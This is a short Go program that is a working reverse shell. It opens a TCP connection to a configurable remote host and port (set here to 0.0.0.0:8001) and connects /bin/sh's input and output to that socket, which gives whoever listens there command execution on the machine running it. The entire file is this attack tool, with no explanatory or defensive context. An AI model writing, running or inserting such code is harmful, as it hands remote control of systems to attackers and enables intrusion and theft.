package main


import (
	"os/exec"
	"net"
	"fmt"
)

const(
	RPORT = "8001"
	RHOST = "0.0.0.0"
)

func main(){

  conn, err := net.Dial("tcp",fmt.Sprintf("%s:%s", RHOST,RPORT))
 	if err != nil{
 		panic("")
 	}
  cmd:=exec.Command("/bin/sh");
  cmd.Stdin=conn;
  cmd.Stdout=conn;
  cmd.Stderr=conn;
  cmd.Run();


}

